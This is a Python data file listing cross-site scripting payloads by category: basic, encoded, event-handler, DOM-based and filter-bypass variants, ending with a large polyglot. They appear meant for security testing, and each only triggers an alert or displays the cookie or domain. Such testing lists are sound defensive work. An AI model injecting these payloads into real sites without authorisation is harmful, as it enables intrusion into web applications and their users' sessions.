# A comprehensive list of XSS payloads organized by category
PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\">",
    ],
    "encoded": [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
    ],
    "event_handlers": [
        "<img src=x onerror=alert(document.cookie)>",
        "<div onmouseover=alert('XSS')>hover me</div>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ],
    "dom_based": [
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<svg><script>alert(document.domain)</script>",
    ],
    "filter_bypass": [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<img src=x onerror='alert\\`XSS\\`'>",
        "<svg/onload=alert('XSS')>",
        "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    ]
}

# Flatten all payloads for easy iteration
ALL_PAYLOADS = []
for category, payloads in PAYLOADS.items():
    ALL_PAYLOADS.extend(payloads)
